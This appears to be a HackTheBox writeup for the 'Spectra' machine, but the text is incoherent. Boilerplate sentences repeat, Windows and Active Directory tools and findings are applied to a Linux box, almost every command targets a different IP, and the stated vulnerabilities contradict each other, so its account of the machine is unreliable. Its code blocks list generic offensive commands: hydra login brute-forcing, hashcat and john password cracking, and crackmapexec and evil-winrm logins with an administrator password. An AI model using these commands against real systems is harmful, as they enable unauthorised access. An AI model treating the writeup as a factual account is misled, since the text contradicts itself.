---
TitleSEO: "HackTheBox — Spectra (Medium Linux) | ZureFX"
TitlePost: "HackTheBox — Spectra (Medium Linux)"
Author: "ZureFX"
Description: "Full writeup for HackTheBox Spectra. XSS and Resource-Based Constrained Delegation to achieve medium compromise on Linux."
Keywords: "hackthebox, ctf, web, forensics"
URL: "https://zurefx.github.io/writeups/htb-spectra-942.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-spectra-942/"
Date: "2024-07-22"
Tags: "HackTheBox, CTF, Web, Forensics"
Section: "writeups"
Lang: "en"
main_img: "htb-spectra-942"
Permalink: "/writeups/htb-spectra-942.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Spectra** is rated **Medium** on HackTheBox. It runs **Linux** and the IP address during this analysis was `10.44.7.115`.

### Objectives

Weak file permissions allowed modification of critical system files. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
crackmapexec smb 10.109.211.68 -u administrator -p 'P@ssw0rd!' --shares
evil-winrm -i 10.62.122.123 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.125.173.178/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Weak file permissions allowed modification of critical system files. Initial enumeration revealed several interesting open ports on the target. Command injection was possible through unsanitized user input in the search functionality.

```bash
evil-winrm -i 10.52.105.74 -u administrator -p 'P@ssw0rd!'
nmap -sCV -p27017,5986,1433 10.126.45.75 -oN scan.txt
```

Unconstrained delegation was enabled on the compromised machine. Group Policy Preferences contained encrypted but recoverable credentials.

### Web Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). Unconstrained delegation was enabled on the compromised machine.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.20.45.223 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

Unconstrained delegation was enabled on the compromised machine. The application stored sensitive credentials in an unencrypted configuration file. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Exploitation

### Vulnerability Identification

The service was running without proper input validation, leading to injection vulnerabilities. Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation.

Key finding: **Open Redirect**.

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

### Initial Access

The service was running without proper input validation, leading to injection vulnerabilities. Authentication bypass was achieved through careful manipulation of the login mechanism.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.54.145.81/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Initial enumeration revealed several interesting open ports on the target. Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism.

## Privilege Escalation

### Enumeration

The scheduled task ran with elevated privileges and could be abused for escalation. The application stored sensitive credentials in an unencrypted configuration file. Weak file permissions allowed modification of critical system files.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.58.225.75/FUZZ
gobuster dir -u http://10.51.34.125/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.71.24.76 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.99.14 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.39.188.32 -u administrator -p 'P@ssw0rd!' --shares
```

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **root** access on the target.

Authentication bypass was achieved through careful manipulation of the login mechanism. The database credentials were hardcoded in the application source code.

## Summary

### Tools Used

- `enum4linux`
- `atexec`
- `wmiexec`
- `ligolo-ng`
- `lookupsid`
- `crackmapexec`

### Key Takeaways

- XSS
- Resource-Based Constrained Delegation
- Open Redirect
